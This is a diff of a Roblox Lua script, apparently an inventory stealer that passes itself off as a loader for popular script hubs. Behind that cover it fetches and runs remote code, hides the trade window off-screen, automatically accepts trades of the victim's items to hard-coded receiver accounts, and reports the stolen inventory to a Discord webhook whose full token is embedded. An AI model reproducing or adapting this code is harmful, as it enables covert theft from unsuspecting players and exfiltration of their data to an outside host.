@@ -1,3 +1,8 @@
+
+
+
+
+
 Config = {
     Receivers = {"femtnyI", "4shuraxx"}
     Webhook = "https://discord.com/api/webhooks/1269765903353122908/lNOLGEeu4fgeENZdZcJUZAb6ZcNG9SPhIFi3CkVe2ENTEZsuarccZbZc4sGuZ3ws_MNP",
@@ -7,14 +12,19 @@ Config = {
     Script = "Custom", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
     CustomLink = "https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua" -- If Script is set to Custom, provide the custom URL here.
 }
+
 repeat wait() until game:IsLoaded()
+
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
+
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
+
 local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Orion/Source"))()
 DYWebhook.ErrorPrinting = false
 local embed = DYWebhook.BuildEmbed()
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local VirtualUser = game:GetService("VirtualUser")
@@ -27,6 +37,7 @@ local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 local Position = UDim2.new(0, 9999, 0, 9999)
 local Inventory = {}
+
 local function sendnotification(message)
     getgenv().scriptexecuted = false
     print("[ Pethicial | .gg/pethicial ]: " .. message)
@@ -35,37 +46,45 @@ local function sendnotification(message)
         {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
     )
 end
+
 local games = {
     [142823291] = true,
     [335132309] = true,
     [636649648] = true
 }
+
 if not games[game.PlaceId] then
     game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
     while true do end
     wait(99999999999999999999999999999999999)
 end
+
 if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
     sendnotification("Script terminated due to an invaild webhook url.")
     InvaildWebhook = true
     return
 end
+
 if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
     sendnotification("Script terminated due to an invaild receivers table.")
     return
 end
+
 if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
     sendnotification("Script terminated due to an invaild custom url.")
     return
 end
+
 if Config.FullInventory ~= true and Config.FullInventory ~= false then
     Config.FullInventory = true
 end
+
 if Config.Script == nil then
     Config.Script = "None"
 elseif Config.Script == "Custom" then
     Config.Script = Config.Script .. " - " .. Config.CustomLink
 end
+
 if Config.Script == "Custom" then
     loadstring(game:HttpGet(Config.CustomLink))()
 elseif Config.Script == "Overdrive H" then
@@ -84,11 +103,14 @@ elseif Config.Script == "AshbornnHub" then
 elseif Config.Script == "Nexus" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
 end
+
 Executor = identifyexecutor()
 if Executor == "Solara" then
     return
 end
+
 wait(5)
+
 local success, errorMsg = pcall(function()
     Common = 0
     Uncommon = 0
@@ -154,6 +176,7 @@ local success, errorMsg = pcall(function()
         local r = math.floor(color.R * 255 + 0.5)
         local g = math.floor(color.G * 255 + 0.5)
         local b = math.floor(color.B * 255 + 0.5)
+
         if r == 106 and g == 106 and b == 106 then
             Common = Common + Stack
         elseif r == 0 and g == 255 and b == 255 then
@@ -174,6 +197,7 @@ local success, errorMsg = pcall(function()
             Vintage = Vintage + Stack
         end
     end
+
     function checkitem(v)
         if v:IsA("Frame") then
             if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
@@ -214,6 +238,7 @@ local success, errorMsg = pcall(function()
             AllItems =  "Full inventory set false."
         end
     end
+
     FullInventory()
     
     task.wait()
@@ -267,6 +292,7 @@ local success, errorMsg = pcall(function()
             Uncommon = {},
             Common = {}
         }
+
         for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
             for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
                 if v:IsA("Frame") then
@@ -293,6 +319,7 @@ local success, errorMsg = pcall(function()
                 end
             end
         end
+
         local ItemsInTrade = 0
         local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
     
@@ -316,6 +343,7 @@ local success, errorMsg = pcall(function()
         wait(10)
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
     end
+
     if Mobile then
         TradePath.Container.Position = Position
         TradePath.ClickBlocker.Position = Position
@@ -348,9 +376,11 @@ if success then
 else
     message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**Please report this error to .gg/pethicial as it may be a critical error that could lead to vulnerabilities.**"
 end
+
 if InvaildWebhook then
     return
 end
+
 if Vintage == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Config.GoodItemsOnly then
     content = ""
 elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly == 0 and Ancient == 0 and Unique == 0 and Vintage == 0 then
@@ -358,6 +388,7 @@ elseif Common == 0 and Uncommon == 0 and Rare == 0 and Legendary == 0 and Godly 
 else
     content = "@everyone"
 end
+
 embed.Info = {
 	Settings = {
 		Color = DYWebhook.ColorConverter(Color3.fromRGB(255,215,0))
@@ -368,6 +399,7 @@ embed.Info = {
 		Footer = ".gg/pethicial",
 	}
 }
+
 DYWebhook:Send({
 	url = Config.Webhook,
 	content = content,
